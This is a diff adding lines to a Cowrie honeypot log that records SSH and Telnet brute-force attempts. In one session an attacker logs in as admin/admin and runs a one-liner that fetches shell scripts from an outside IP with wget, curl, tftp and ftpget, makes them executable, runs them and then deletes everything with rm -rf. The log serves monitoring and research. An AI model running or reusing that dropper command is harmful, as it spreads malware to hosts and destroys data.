@@ -3509,3 +3509,90 @@
 2017-05-19T12:23:58+0000 [HoneyPotSSHTransport,109378,51.15.48.238] NEW KEYS
 2017-05-19T12:23:58+0000 [HoneyPotSSHTransport,109378,51.15.48.238] starting service 'ssh-userauth'
 2017-05-19T12:23:58+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,109378,51.15.48.238] 'admin' trying auth 'password'
+2017-05-19T12:24:01+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,109378,51.15.48.238] login attempt: 35
+2017-05-19T12:24:01+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,109378,51.15.48.238] login return, expect: [admin/admin]
+2017-05-19T12:24:03+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,109378,51.15.48.238] login attempt [admin/admin] succeeded
+2017-05-19T12:24:04+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,109378,51.15.48.238] 'admin' authenticated with 'password'
+2017-05-19T12:24:04+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,109378,51.15.48.238] starting service 'ssh-connection'
+2017-05-19T12:24:04+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 113.195.145.21:34234 (10.8.41.81:2222) [session: ebef52c4]
+2017-05-19T12:24:04+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,109378,51.15.48.238] got channel 'session' request
+2017-05-19T12:24:04+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,109378,51.15.48.238] channel open
+2017-05-19T12:24:04+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,109378,51.15.48.238] executing command "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://51.15.39.162/bins.sh; curl -O http://51.15.39.162/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 51.15.39.162 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 51.15.39.162; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 51.15.39.162 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *"
+2017-05-19T12:24:04+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,109378,51.15.48.238] Opening TTY Log: log/tty/20170519-122404-f66ac2f5-0e.log
+2017-05-19T12:24:04+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,109378,51.15.48.238] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://51.15.39.162/bins.sh; curl -O http://51.15.39.162/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 51.15.39.162 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 51.15.39.162; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 51.15.39.162 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *
+2017-05-19T12:24:04+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,109378,51.15.48.238] Command found: cd /tmp
+2017-05-19T12:24:04+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,109378,51.15.48.238] Command found: cd /var/run
+2017-05-19T12:24:04+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,109378,51.15.48.238] Command found: cd /mnt
+2017-05-19T12:24:04+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,109378,51.15.48.238] Command found: cd /root
+2017-05-19T12:24:04+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,109378,51.15.48.238] Command found: cd /
+2017-05-19T12:24:04+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,109378,51.15.48.238] Command found: wget http://51.15.39.162/bins.sh
+2017-05-19T12:24:04+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://51.15.39.162/bins.sh>
+2017-05-19T12:24:04+0000 [HTTPPageDownloader,client] Command found: curl -O http://51.15.39.162/bins.sh
+2017-05-19T12:24:04+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://51.15.39.162/bins.sh>
+2017-05-19T12:24:04+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://51.15.39.162/bins.sh>
+2017-05-19T12:24:04+0000 [HTTPPageDownloader,client] Command found: chmod 777 bins.sh
+2017-05-19T12:24:04+0000 [HTTPPageDownloader,client] Command found: sh bins.sh
+2017-05-19T12:24:04+0000 [HTTPPageDownloader,client] Command found: tftp 51.15.39.162 -c get tftp1.sh
+2017-05-19T12:24:04+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp1.sh
+2017-05-19T12:24:04+0000 [HTTPPageDownloader,client] Command found: sh tftp1.sh
+2017-05-19T12:24:04+0000 [HTTPPageDownloader,client] Command found: tftp -r tftp2.sh -g 51.15.39.162
+2017-05-19T12:24:04+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp2.sh
+2017-05-19T12:24:04+0000 [HTTPPageDownloader,client] Command found: sh tftp2.sh
+2017-05-19T12:24:04+0000 [HTTPPageDownloader,client] Command found: ftpget -v -u anonymous -p anonymous -P 21 51.15.39.162 ftp1.sh ftp1.sh
+2017-05-19T12:24:04+0000 [HTTPPageDownloader,client] FTP retrieval failed: 425 Security: Bad IP connecting.
+2017-05-19T12:24:04+0000 [HTTPPageDownloader,client] Command found: sh ftp1.sh
+2017-05-19T12:24:04+0000 [HTTPPageDownloader,client] Command found: rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh
+2017-05-19T12:24:04+0000 [HTTPPageDownloader,client] Command found: rm -rf /lost+found /vmlinuz /srv /sys /run /sbin /proc /mnt /bin /usr /tmp /var /initrd.img /etc /opt /boot /selinux /home /media /lib /root /dev
+2017-05-19T12:24:04+0000 [HTTPPageDownloader,client] exitCode: 0
+2017-05-19T12:24:04+0000 [HTTPPageDownloader,client] sending request 'exit-status'
+2017-05-19T12:24:04+0000 [HTTPPageDownloader,client] Closing TTY Log: log/tty/20170519-122404-f66ac2f5-0e.log after 0 seconds
+2017-05-19T12:24:04+0000 [HTTPPageDownloader,client] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-05-19T12:24:04+0000 [HTTPPageDownloader,client] sending close 0
+2017-05-19T12:24:04+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://51.15.39.162/bins.sh>
+2017-05-19T12:24:05+0000 [HoneyPotSSHTransport,109379,113.195.145.21] Remote SSH version: SSH-2.0-PUTTY
+2017-05-19T12:24:05+0000 [HoneyPotSSHTransport,109379,113.195.145.21] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-05-19T12:24:05+0000 [HoneyPotSSHTransport,109379,113.195.145.21] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-05-19T12:24:05+0000 [HoneyPotSSHTransport,109379,113.195.145.21] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-05-19T12:24:05+0000 [HoneyPotSSHTransport,109379,113.195.145.21] NEW KEYS
+2017-05-19T12:24:06+0000 [HoneyPotSSHTransport,109379,113.195.145.21] starting service 'ssh-userauth'
+2017-05-19T12:24:06+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,109379,113.195.145.21] 'root' trying auth 'none'
+2017-05-19T12:24:08+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,109379,113.195.145.21] 'root' authenticated with 'none'
+2017-05-19T12:24:08+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,109379,113.195.145.21] starting service 'ssh-connection'
+2017-05-19T12:24:08+0000 [HoneyPotSSHTransport,109379,113.195.145.21] Got remote error, code 11
+	reason: 
+2017-05-19T12:24:08+0000 [HoneyPotSSHTransport,109379,113.195.145.21] avatar root logging out
+2017-05-19T12:24:08+0000 [HoneyPotSSHTransport,109379,113.195.145.21] connection lost
+2017-05-19T12:24:08+0000 [HoneyPotSSHTransport,109379,113.195.145.21] Connection lost after 4 seconds
+2017-05-19T12:24:14+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,109378,51.15.48.238] remote close
+2017-05-19T12:24:14+0000 [HoneyPotSSHTransport,109378,51.15.48.238] avatar admin logging out
+2017-05-19T12:24:14+0000 [HoneyPotSSHTransport,109378,51.15.48.238] connection lost
+2017-05-19T12:24:14+0000 [HoneyPotSSHTransport,109378,51.15.48.238] Connection lost after 16 seconds
+2017-05-19T12:24:34+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 113.195.145.21:31866 (10.8.41.81:2222) [session: ea9f72a8]
+2017-05-19T12:24:34+0000 [HoneyPotSSHTransport,109380,113.195.145.21] Remote SSH version: SSH-2.0-PUTTY
+2017-05-19T12:24:34+0000 [HoneyPotSSHTransport,109380,113.195.145.21] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-05-19T12:24:34+0000 [HoneyPotSSHTransport,109380,113.195.145.21] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-05-19T12:24:34+0000 [HoneyPotSSHTransport,109380,113.195.145.21] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-05-19T12:24:36+0000 [HoneyPotSSHTransport,109380,113.195.145.21] NEW KEYS
+2017-05-19T12:24:36+0000 [HoneyPotSSHTransport,109380,113.195.145.21] starting service 'ssh-userauth'
+2017-05-19T12:24:37+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,109380,113.195.145.21] 'root' trying auth 'none'
+2017-05-19T12:24:39+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,109380,113.195.145.21] 'root' authenticated with 'none'
+2017-05-19T12:24:39+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,109380,113.195.145.21] starting service 'ssh-connection'
+2017-05-19T12:24:39+0000 [HoneyPotSSHTransport,109380,113.195.145.21] Got remote error, code 11
+	reason: 
+2017-05-19T12:24:39+0000 [HoneyPotSSHTransport,109380,113.195.145.21] avatar root logging out
+2017-05-19T12:24:39+0000 [HoneyPotSSHTransport,109380,113.195.145.21] connection lost
+2017-05-19T12:24:39+0000 [HoneyPotSSHTransport,109380,113.195.145.21] Connection lost after 4 seconds
+2017-05-19T12:24:39+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 185.107.80.140:34942 (10.8.41.81:2223) [session: TT95779]
+2017-05-19T12:24:44+0000 [CowrieTelnetTransport,95779,185.107.80.140] login attempt: 5130
+2017-05-19T12:24:44+0000 [CowrieTelnetTransport,95779,185.107.80.140] login return, expect: [Administrator/meinsm]
+2017-05-19T12:24:45+0000 [CowrieTelnetTransport,95779,185.107.80.140] login attempt [root/] failed
+2017-05-19T12:24:45+0000 [CowrieTelnetTransport,95779,185.107.80.140] Warning: state changed and new state returned
+2017-05-19T12:24:45+0000 [CowrieTelnetTransport,95779,185.107.80.140] login attempt: 5131
+2017-05-19T12:24:45+0000 [CowrieTelnetTransport,95779,185.107.80.140] login return, expect: [Administrator/meinsm]
+2017-05-19T12:24:46+0000 [CowrieTelnetTransport,95779,185.107.80.140] login attempt [enable/shell] failed
+2017-05-19T12:24:46+0000 [CowrieTelnetTransport,95779,185.107.80.140] Warning: state changed and new state returned
+2017-05-19T12:24:46+0000 [CowrieTelnetTransport,95779,185.107.80.140] login attempt: 5132
+2017-05-19T12:24:46+0000 [CowrieTelnetTransport,95779,185.107.80.140] login return, expect: [Administrator/meinsm]
+2017-05-19T12:24:48+0000 [CowrieTelnetTransport,95779,185.107.80.140] login attempt [sh//bin/busybox ECCHI] failed
+2017-05-19T12:24:48+0000 [CowrieTelnetTransport,95779,185.107.80.140] Warning: state changed and new state returned
